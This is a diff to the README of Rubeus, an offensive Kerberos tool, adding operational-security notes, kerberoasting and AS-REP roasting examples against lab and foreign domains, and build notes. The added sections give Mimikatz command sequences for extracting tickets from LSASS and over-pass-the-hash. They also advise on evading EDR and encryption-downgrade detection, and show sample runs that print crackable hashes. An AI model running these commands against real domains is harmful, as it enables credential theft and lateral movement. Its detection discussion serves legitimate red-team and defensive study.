@@ -18,6 +18,11 @@ Rubeus is licensed under the BSD 3-Clause license.
   * [Table of Contents](#table-of-contents)
   * [Background](#background)
     + [Command Line Usage](#command-line-usage)
+    + [Opsec Notes](#opsec-notes)
+      - [Overview](#overview)
+      - [Weaponization](#weaponization)
+      - [Example: Credential Extraction](#example--credential-extraction)
+      - [Example: Over-pass-the-hash](#example--over-pass-the-hash)
   * [Ticket requests and renewals](#ticket-requests-and-renewals)
     + [asktgt](#asktgt)
     + [asktgs](#asktgs)
@@ -42,6 +47,7 @@ Rubeus is licensed under the BSD 3-Clause license.
     + [createnetonly](#createnetonly)
     + [changepw](#changepw)
   * [Compile Instructions](#compile-instructions)
+    + [Targeting other .NET versions](#targeting-other-net-versions)
     + [Sidenote: Building Rubeus as a Library](#sidenote-building-rubeus-as-a-library)
     + [Sidenote: Running Rubeus Through PowerShell](#sidenote-running-rubeus-through-powershell)
 
@@ -108,19 +114,19 @@ Rubeus is licensed under the BSD 3-Clause license.
     Roasting:
 
         Perform Kerberoasting:
-            Rubeus.exe kerberoast [/spn:"blah/blah"] [/user:USER] [/ou:"OU,..."]
+            Rubeus.exe kerberoast [/spn:"blah/blah"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."]
 
         Perform Kerberoasting, outputting hashes to a file:
-            Rubeus.exe kerberoast /outfile:hashes.txt [/spn:"blah/blah"] [/user:USER] [/ou:"OU,..."]
+            Rubeus.exe kerberoast /outfile:hashes.txt [/spn:"blah/blah"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."]
 
         Perform Kerberoasting with alternate credentials:
-            Rubeus.exe kerberoast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/spn:"blah/blah"] [/user:USER] [/ou:"OU,..."]
+            Rubeus.exe kerberoast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/spn:"blah/blah"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."]
 
         Perform AS-REP "roasting" for any users without preauth:
-            Rubeus.exe asreproast [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU,..."]
+            Rubeus.exe asreproast [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."]
 
-        Perform AS-REP "roasting" for any users without preauth, outputting hashes to a file:
-            Rubeus.exe asreproast /outfile:hashes.txt [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU,..."]
+        Perform AS-REP "roasting" for any users without preauth, outputting Hashcat format to a file:
+            Rubeus.exe asreproast /outfile:hashes.txt /format:hashcat [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."]
 
         Perform AS-REP "roasting" for any users without preauth using alternate credentials:
             Rubeus.exe asreproast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU,..."]
@@ -139,6 +145,65 @@ Rubeus is licensed under the BSD 3-Clause license.
 
         [IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("aa..."))
 
+
+### Opsec Notes
+
+This section covers some notes on the operational security of using Rubeus in an environment, with some technical examples comparing/contrasting some of its approaches to Mimikatz. The material here will be expanded in the future.
+
+#### Overview
+
+Any action you perform on a system is a detectable risk, especially when abusing functionality in "weird"/unintended ways. Rubeus (like any attacker toolset) can be detected in a number of methods, either from the host, network, or domain perspectives. I have a workmate who is fond of stating _"everything is stealthy until someone is looking for it"_ - tools and techniques generally evade detection because either a) people are not sufficiently aware of the tool/technique and therefore not even looking, b) people can not collect and process the data needed at the appropriate scale, or c) the tool/technique blends with existing behavior to sufficiently sneak in with false positives in an environment. There is much more information on these steps and detection subversion in general in [Matt Graeber](https://twitter.com/mattifestation) and [Lee Christensen](https://twitter.com/tifkin_)’s Black Hat USA 2018 [“Subverting Sysmon”](https://i.blackhat.com/us-18/Wed-August-8/us-18-Graeber-Subverting-Sysmon-Application-Of-A-Formalized-Security-Product-Evasion-Methodology.pdf) talk and associated [whitepaper](https://specterops.io/assets/resources/Subverting_Sysmon.pdf).
+
+From the host perspective, Rubeus can be caught during initial [weaponization](#weaponization) of the code itself, by an abnormal (non-lsass.exe) process issuing raw Kerberos port 88 traffic, through the use of sensitive APIs like LsaCallAuthenticationPackage(), or by abnormal tickets being present on the host (e.g. rc4\_hmac use in tickets in a modern environment).
+
+From a network or domain controller log perspective, since Rubeus implements many parts of the normal Kerberos protocol, the main detection method involves the use of rc4\_hmac in Kerberos exchanges. Modern Windows domains (functional level 2008 and above) use AES encryption by default in normal Kerberos exchanges (with a few exceptions like inter-realm trust tickets). Using a rc4\_hmac (NTLM) hash is used in a Kerberos exchange instead of a aes256\_cts\_hmac\_sha1 (or aes128) key results in some signal that is detectable at the host level, network level (if Kerberos traffic is parsed), and domain controller event log level, sometimes known as "encryption downgrade".
+
+#### Weaponization
+
+One common way attack tools are detected is through the weaponization vector for the code. If Rubeus is run [through PowerShell](#sidenote-running-rubeus-through-powershell) (this includes Empire) the standard PowerShell V5 protections all apply (deep script block logging, AMSI, etc.). If Rubeus is executed as a binary on disk, standard AV signature detection comes into play (part of why we [do not release](#compile-instructions) compiled versions of Rubeus, as brittle signatures are silly ; ). If Rubeus is used as a [library](#sidenote-building-rubeus-as-a-library) then it's susceptible to whatever method the primary tool uses to get running. And if Rubeus is run through unmanaged assembly execution (like Cobalt Strike's `execute_assembly`) cross-process code injection is performed and the CLR is loaded into a potentially non-.NET process, though this signal is present for the execution of any .NET code using this method.
+
+Also, AMSI (the Antimalware Scan Interface) has been [added to .NET 4.8](https://blogs.msdn.microsoft.com/dotnet/2018/11/28/announcing-net-framework-4-8-early-access-build-3694/). [Ryan Cobb](https://twitter.com/cobbr_io) has additional details on the offensive implications of this in the **Defense** section of his [“Entering a Covenant: .NET Command and Control”](https://posts.specterops.io/entering-a-covenant-net-command-and-control-e11038bcf462) post.
+
+#### Example: Credential Extraction
+
+Say we have elevated access on a machine and want to extract user credentials for reuse.
+
+Mimikatz is the swiss army knife of credential extraction, with multiple options. The `sekurlsa::logonpasswords` command will open up a [read handle to LSASS](https://github.com/gentilkiwi/mimikatz/blob/a0f243b33590751a77b6d6f275313a4fe8d42c82/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c#L168), enumerate logon sessions present on the system, walk the default authentication packages for each logon session, and extract any reverseable password/credential material present. **Sidenote**: the `sekurlsa::ekeys` command will enumerate ALL key types present for the Kerberos package.
+
+Rubeus doesn't have any code to touch LSASS (and none is intended), so its functionality is limited to extracting Kerberos tickets through use of the LsaCallAuthenticationPackage() API. From a non-elevated standpoint, the session keys for TGTs are not returned (by default) so only service tickets extracted will be usable (the **tgtdeleg** command uses a Kekeo trick to get a usable TGT for the current user). If in a high-integrity context, a [GetSystem](https://github.com/GhostPack/Rubeus/blob/4c9145752395d48a73faf326c4ae57d2c565be7f/Rubeus/lib/Helpers.cs#L55-L107) equivalent utilizing token duplication is run to elevate to SYSTEM, and a fake logon application is registered with the LsaRegisterLogonProcess() API call. This allows for privileged enumeration and extraction of all tickets currently registered with LSA on the system, resulting in base64 encoded .kirbi's being output for later reuse.
+
+Mimikatz can perform the same base64 .kirbi extraction with the following series of commands:
+
+    mimikatz # privilege::debug
+    mimikatz # token::elevate
+    mimikatz # standard::base64 /output:true
+    mimikatz # kerberos::list /export
+
+Mimikatz can also carve tickets directly out of LSASS' memory with:
+
+    mimikatz # privilege::debug
+    mimikatz # standard::base64 /output:true
+    mimikatz # sekurlsa::tickets /export
+
+As "everything is stealthy until someone is looking for it", it's arguable whether LSASS manipulation or ticket extraction via the LsaCallAuthenticationPackage() API call is more "stealthy". Due to Mimikatz' popularity, opening up a handle to LSASS and reading/writing its memory has become a big target for EDR detection and/or prevention. However, LsaCallAuthenticationPackage() is used by a fairly limited set of processes, and creating a fake logon application with LsaRegisterLogonProcess() is also fairly anomalous behavior. However full API level introspection and baselining appears to be a more difficult technical problem than LSASS protection.
+
+#### Example: Over-pass-the-hash
+
+Say we recover a user's rc4\_hmac hash (NTLM) and want to reuse this credential to compromise an additional machine where the user account has privileged access. 
+
+**Sidenote:** pass-the-hash != over-pass-the-hash. The traditional pass-the-hash technique involves reusing a hash through the NTLMv1/NTLMv2 protocol, which doesn't touch Kerberos at all. The over-pass-the-hash approach was developed by [Benjamin Delpy](https://twitter.com/gentilkiwi) and [Skip Duckwall](https://twitter.com/passingthehash) (see their ["Abusing Microsoft Kerberos - Sorry you guys don't get it"](https://www.slideshare.net/gentilkiwi/abusing-microsoft-kerberos-sorry-you-guys-dont-get-it/18) presentation for more information). This approach turns a hash/key (rc4\_hmac, aes256\_cts\_hmac\_sha1, etc.) for a domain-joined user into a fully-fledged ticket-granting-ticket (TGT).
+
+Let's compare "over-passing-the-hash" via Mimikatz' `sekurlsa::pth` command verus using the `asktgt` command from Rubeus (or [Kekeo](https://github.com/gentilkiwi/kekeo/) if you'd like).
+
+When `sekurlsa::pth` is used to over-pass-the-hash, Mimikatz first creates a new [logon type 9 process](https://github.com/gentilkiwi/mimikatz/blob/3d8be22fff9f7222f9590aa007629e18300cf643/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c#L926) with dummy credentials - this creates a new "sacrificial" logon session that doesn't interact with the current logon session. It then opens the LSASS process with the ability to write to process memory, and the supplied hash/key is then [patched into the appropriate section](https://github.com/gentilkiwi/mimikatz/blob/a0f243b33590751a77b6d6f275313a4fe8d42c82/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_kerberos.c#L566-L600) for the associated logon session (in this case, the "sacrificial" logon session that was started). This causes the normal Kerberos authentication process to kick off as normal as if the user had normally logged on, turning the supplied hash into a fully-fledged TGT.
+
+When Rubeus' `asktgt` command is run (or Kekeo's equivalent), the raw Kerberos protocol is used to request a TGT, which is then applied to the current logon session if the `/ptt` flag is passed.
+
+With the Mimikatz approach, administrative rights are needed as you are manipulating LSASS memory directly. As previously mentioned, Mimikatz' popularity has also led to this type of behavior (opening up a handle to LSASS and reading/writing its memory) being a big target for EDR detection and/or prevention. With the Rubeus/Kekeo approach, administrative rights are not needed as LSASS is not being touched. However, if the ticket is applied to the current logon session (with `/ptt`), the TGT for the current logon session will be overwritten. This behavior can be avoided (with administrative access) by using the `/createnetonly` command to create a sacrificial process/logon session, then using `/ptt /ticket:X /luid:0xa..` with the newly created process LUID. If using Cobalt Strike, using the **make\_token** command with dummy credentials and then **kerberos\_ticket\_use** with the ticket retrieved by Rubeus will let you apply the new TGT in a way that a) doesn't need administrative rights and b) doesn't stomp on the current logon session TGT.
+
+It is our opinion that the LSASS manipulation approach is more likely (at the current moment) to be detected or mitigated due to the popularity of the technique. However the Rubeus approach does result in another piece of detectable behavior. Kerberos traffic to port 88 should normally only originate from lsass.exe - sending raw traffic of this type from an abnormal process could be detectable if the information can be gathered.
+
+**Sidenote**: one way _both_ approaches can potentially be caught is the previously mentioned "encryption downgrade" detection. To retrieve AES keys, use Mimikatz' `sekurlsa::ekeys` module to return ALL Kerberos encryption keys (same with `lsadump::dcsync`) which are better to use when trying to evade some detections.
 
 
 ## Ticket requests and renewals
@@ -1455,7 +1520,7 @@ Breakdown of the roasting commands:
 
 The **kerberoast** action replaces the [SharpRoast](https://github.com/GhostPack/SharpRoast) project's functionality. Like SharpRoast, this action uses the [KerberosRequestorSecurityToken.GetRequest Method()](https://msdn.microsoft.com/en-us/library/system.identitymodel.tokens.kerberosrequestorsecuritytoken.getrequest(v=vs.110).aspx) method that was contributed to PowerView by [@machosec](https://twitter.com/machosec) in order to request the proper service ticket. Unlike SharpRoast, this action now performs proper ASN.1 parsing of the result structures.
 
-With no other arguments, all user accounts with SPNs set in the current domain are kerberoasted. The `/spn:X` argument roasts just the specified SPN, the `/user:X` argument roasts just the specified user, and the `/ou:X` argument roasts just users in the specific OU.
+With no other arguments, all user accounts with SPNs set in the current domain are kerberoasted. The `/spn:X` argument roasts just the specified SPN, the `/user:X` argument roasts just the specified user, and the `/ou:X` argument roasts just users in the specific OU. The `/domain` and `/dc` arguments are optional, pulling system defaults as other actions do.
 
 The `/outfile:FILE` argument outputs roasted hashes to the specified file, one per line.
 
@@ -1472,9 +1537,11 @@ Kerberoasting all users in the current domain:
     | |  \ \| |_| | |_) ) ____| |_| |___ |
     |_|   |_|____/|____/|_____)____/(___/
 
-    v1.3.3
+    v1.3.4
+
 
     [*] Action: Kerberoasting
+
 
     [*] SamAccountName         : harmj0y
     [*] DistinguishedName      : CN=harmj0y,CN=Users,DC=testlab,DC=local
@@ -1523,9 +1590,12 @@ Kerberoasting all users in a specific OU, saving the hashes to an output file:
     | |  \ \| |_| | |_) ) ____| |_| |___ |
     |_|   |_|____/|____/|_____)____/(___/
 
-    v1.3.3
+    v1.3.4
+
 
     [*] Action: Kerberoasting
+
+    [*] Target OU              : OU=TestingOU,DC=testlab,DC=local
 
     [*] SamAccountName         : testuser2
     [*] DistinguishedName      : CN=testuser2,OU=TestingOU,DC=testlab,DC=local
@@ -1546,9 +1616,11 @@ Kerberoasting a specific user:
     | |  \ \| |_| | |_) ) ____| |_| |___ |
     |_|   |_|____/|____/|_____)____/(___/
 
-    v1.3.3
+    v1.3.4
 
     [*] Action: Kerberoasting
+
+    [*] Target User            : sqlservice
 
     [*] SamAccountName         : sqlservice
     [*] DistinguishedName      : CN=SQL,CN=Users,DC=testlab,DC=local
@@ -1571,8 +1643,58 @@ Kerberoasting a specific SPN:
 
     [*] Action: Kerberoasting
 
-    [*] ServicePrincipalName   : MSSQLSvc/SQL.testlab.local
+    [*] Target SPN             : MSSQLSvc/SQL.testlab.local
     [*] Hash                   : $krb5tgs$23$*$DOMAIN$MSSQLSvc/SQL.testlab.local*$E2B3869290BA2AD82...(snip)...
+
+
+Kerberoasting all users in a foreign _trusting_ domain:
+
+    C:\Rubeus>Rubeus.exe kerberoast /domain:dev.testlab.local
+
+     ______        _
+    (_____ \      | |
+     _____) )_   _| |__  _____ _   _  ___
+    |  __  /| | | |  _ \| ___ | | | |/___)
+    | |  \ \| |_| | |_) ) ____| |_| |___ |
+    |_|   |_|____/|____/|_____)____/(___/
+
+    v1.3.4
+
+
+    [*] Action: Kerberoasting
+
+    [*] Target Domain          : dev.testlab.local
+
+    [*] SamAccountName         : jason
+    [*] DistinguishedName      : CN=jason,CN=Users,DC=dev,DC=testlab,DC=local
+    [*] ServicePrincipalName   : test/test
+    [*] Hash                   : $krb5tgs$23$*$dev.testlab.local$test/test@dev.testlab.local*$969339A82...(snip)...
+
+
+Kerberoasting users in a foreign non-trusting domain using alternate credentials:
+
+    C:\Rubeus>Rubeus.exe kerberoast /domain:external.local /creduser:"EXTERNAL.local\administrator" /credpassword:"Password123!"
+
+     ______        _
+    (_____ \      | |
+     _____) )_   _| |__  _____ _   _  ___
+    |  __  /| | | |  _ \| ___ | | | |/___)
+    | |  \ \| |_| | |_) ) ____| |_| |___ |
+    |_|   |_|____/|____/|_____)____/(___/
+
+    v1.3.4
+
+
+    [*] Action: Kerberoasting
+
+    [*] Target Domain          : external.local
+    [*] Using alternate creds  : EXTERNAL.local\administrator
+
+    [*] SamAccountName         : admanagement
+    [*] DistinguishedName      : CN=admanagement,CN=Users,DC=external,DC=local
+    [*] ServicePrincipalName   : RestrictedKrbHost/server.external.local
+    [*] Hash                   : $krb5tgs$23$*$external.local$RestrictedKrbHost/server.external.local@external.lo
+                                cal*$28F02F1AF08F9335C...(snip)...
 
 
 ### asreproast
@@ -1598,11 +1720,16 @@ AS-REP roasting all users in the current domain:
     | |  \ \| |_| | |_) ) ____| |_| |___ |
     |_|   |_|____/|____/|_____)____/(___/
 
-    v1.3.3
+    v1.3.4
+
 
     [*] Action: AS-REP roasting
 
-    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
+    [*] Target Domain          : testlab.local
+
+    [*] SamAccountName         : dfm.a
+    [*] DistinguishedName      : CN=dfm.a,CN=Users,DC=testlab,DC=local
+    [*] Using domain controller: testlab.local (192.168.52.100)
     [*] Building AS-REQ (w/o preauth) for: 'testlab.local\dfm.a'
     [*] Connecting to 192.168.52.100:88
     [*] Sent 163 bytes
@@ -1610,9 +1737,11 @@ AS-REP roasting all users in the current domain:
     [+] AS-REQ w/o preauth successful!
     [*] AS-REP hash:
 
-        $krb5asrep$dfm.a@testlab.local:1AEF74CF26B58AC9598CC26B9B6B3F4D$BCA9...(snip)...
+        $krb5asrep$dfm.a@testlab.local:D4A4BC281B200EE35CBF4A4537792D07$D655...(snip)...
 
-    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
+    [*] SamAccountName         : TestOU3user
+    [*] DistinguishedName      : CN=TestOU3user,OU=TestOU3,OU=TestOU2,OU=TestOU1,DC=testlab,DC=local
+    [*] Using domain controller: testlab.local (192.168.52.100)
     [*] Building AS-REQ (w/o preauth) for: 'testlab.local\TestOU3user'
     [*] Connecting to 192.168.52.100:88
     [*] Sent 169 bytes
@@ -1620,9 +1749,11 @@ AS-REP roasting all users in the current domain:
     [+] AS-REQ w/o preauth successful!
     [*] AS-REP hash:
 
-        $krb5asrep$TestOU3user@testlab.local:DAC9D21E8199E3125A771B30C8614FF...(snip)...
+        $krb5asrep$TestOU3user@testlab.local:DD6DF16B7E65223679CD703837C94FB...(snip)..
 
-    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
+    [*] SamAccountName         : harmj0y2
+    [*] DistinguishedName      : CN=harmj0y2,CN=Users,DC=testlab,DC=local
+    [*] Using domain controller: testlab.local (192.168.52.100)
     [*] Building AS-REQ (w/o preauth) for: 'testlab.local\harmj0y2'
     [*] Connecting to 192.168.52.100:88
     [*] Sent 166 bytes
@@ -1630,12 +1761,12 @@ AS-REP roasting all users in the current domain:
     [+] AS-REQ w/o preauth successful!
     [*] AS-REP hash:
 
-        $krb5asrep$harmj0y2@testlab.local:D5D4CE0E4B8CE1511AC7AFF32A4DB080$2...(snip)...
+        $krb5asrep$harmj0y2@testlab.local:7D2E379A076BB804AF275ED51B86BF85$8...(snip)..
 
 
-AS-REP roasting all users in a specific OU, saving the hashes to an output file:
+AS-REP roasting all users in a specific OU, saving the hashes to an output file in Hashcat format:
     
-    C:\Rubeus>Rubeus.exe asreproast /ou:OU=TestOU3,OU=TestOU2,OU=TestOU1,DC=testlab,DC=local /outfile:C:\Temp\hashes.txt
+    C:\Rubeus>Rubeus.exe asreproast /ou:OU=TestOU3,OU=TestOU2,OU=TestOU1,DC=testlab,DC=local /format:hashcat /outfile:C:\Temp\hashes.txt
 
      ______        _
     (_____ \      | |
@@ -1644,11 +1775,17 @@ AS-REP roasting all users in a specific OU, saving the hashes to an output file:
     | |  \ \| |_| | |_) ) ____| |_| |___ |
     |_|   |_|____/|____/|_____)____/(___/
 
-    v1.3.3
+    v1.3.4
+
 
     [*] Action: AS-REP roasting
 
-    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
+    [*] Target OU              : OU=TestOU3,OU=TestOU2,OU=TestOU1,DC=testlab,DC=local
+    [*] Target Domain          : testlab.local
+
+    [*] SamAccountName         : TestOU3user
+    [*] DistinguishedName      : CN=TestOU3user,OU=TestOU3,OU=TestOU2,OU=TestOU1,DC=testlab,DC=local
+    [*] Using domain controller: testlab.local (192.168.52.100)
     [*] Building AS-REQ (w/o preauth) for: 'testlab.local\TestOU3user'
     [*] Connecting to 192.168.52.100:88
     [*] Sent 169 bytes
@@ -1670,11 +1807,17 @@ AS-REP roasting a specific user:
     | |  \ \| |_| | |_) ) ____| |_| |___ |
     |_|   |_|____/|____/|_____)____/(___/
 
-    v1.3.3
+    v1.3.4
+
 
     [*] Action: AS-REP roasting
 
-    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
+    [*] Target User            : TestOU3user
+    [*] Target Domain          : testlab.local
+
+    [*] SamAccountName         : TestOU3user
+    [*] DistinguishedName      : CN=TestOU3user,OU=TestOU3,OU=TestOU2,OU=TestOU1,DC=testlab,DC=local
+    [*] Using domain controller: testlab.local (192.168.52.100)
     [*] Building AS-REQ (w/o preauth) for: 'testlab.local\TestOU3user'
     [*] Connecting to 192.168.52.100:88
     [*] Sent 169 bytes
@@ -1683,6 +1826,70 @@ AS-REP roasting a specific user:
     [*] AS-REP hash:
 
         $krb5asrep$TestOU3user@testlab.local:858B6F645D9F9B57210292E5711E0...(snip)...
+
+
+AS-REP roasting all users in a foreign _trusting_ domain:
+
+    C:\Rubeus>Rubeus.exe asreproast /domain:dev.testlab.local
+
+     ______        _
+    (_____ \      | |
+     _____) )_   _| |__  _____ _   _  ___
+    |  __  /| | | |  _ \| ___ | | | |/___)
+    | |  \ \| |_| | |_) ) ____| |_| |___ |
+    |_|   |_|____/|____/|_____)____/(___/
+
+    v1.3.4
+
+
+    [*] Action: AS-REP roasting
+
+    [*] Target Domain          : dev.testlab.local
+
+    [*] SamAccountName         : devuser3
+    [*] DistinguishedName      : CN=devuser3,CN=Users,DC=dev,DC=testlab,DC=local
+    [*] Using domain controller: dev.testlab.local (192.168.52.105)
+    [*] Building AS-REQ (w/o preauth) for: 'dev.testlab.local\devuser3'
+    [*] Connecting to 192.168.52.105:88
+    [*] Sent 175 bytes
+    [*] Received 1448 bytes
+    [+] AS-REQ w/o preauth successful!
+    [*] AS-REP hash:
+
+        $krb5asrep$devuser3@dev.testlab.local:650B881E44B92FB6A378DD21E8B020...(snip)...
+
+
+AS-REP roasting users in a foreign non-trusting domain using alternate credentials:
+
+    C:\Rubeus>Rubeus.exe asreproast /domain:external.local /creduser:"EXTERNAL.local\administrator" /credpassword:"Password123!"
+
+     ______        _
+    (_____ \      | |
+     _____) )_   _| |__  _____ _   _  ___
+    |  __  /| | | |  _ \| ___ | | | |/___)
+    | |  \ \| |_| | |_) ) ____| |_| |___ |
+    |_|   |_|____/|____/|_____)____/(___/
+
+    v1.3.4
+
+
+    [*] Action: AS-REP roasting
+
+    [*] Target Domain          : external.local
+
+    [*] Using alternate creds  : EXTERNAL.local\administrator
+
+    [*] SamAccountName         : david
+    [*] DistinguishedName      : CN=david,CN=Users,DC=external,DC=local
+    [*] Using domain controller: external.local (192.168.52.95)
+    [*] Building AS-REQ (w/o preauth) for: 'external.local\david'
+    [*] Connecting to 192.168.52.95:88
+    [*] Sent 165 bytes
+    [*] Received 1376 bytes
+    [+] AS-REQ w/o preauth successful!
+    [*] AS-REP hash:
+
+        $krb5asrep$david@external.local:9F5A33465C53056F17FEFDF09B7D36DD$47DBAC3...(snip)...
 
 
 ## Miscellaneous
@@ -1778,8 +1985,11 @@ You can retrieve a TGT blob using the [asktgt](#asktgt) command.
 
 We are not planning on releasing binaries for Rubeus, so you will have to compile yourself :)
 
-Rubeus has been built against .NET 3.5 and is compatible with [Visual Studio 2015 Community Edition](https://go.microsoft.com/fwlink/?LinkId=532606&clcid=0x409). Simply open up the project .sln, choose "release", and build.
+Rubeus has been built against .NET 3.5 and is compatible with [Visual Studio 2015 Community Edition](https://go.microsoft.com/fwlink/?LinkId=532606&clcid=0x409). Simply open up the project .sln, choose "Release", and build.
 
+### Targeting other .NET versions
+
+Rubeus' default build configuration is for .NET 3.5, which will fail on systems without that version installed. To target Rubeus for .NET 4 or 4.5, open the .sln solution, go to **Project** -> **Rubeus Properties** and change the "Target framework" to another version.
 
 ### Sidenote: Building Rubeus as a Library
 
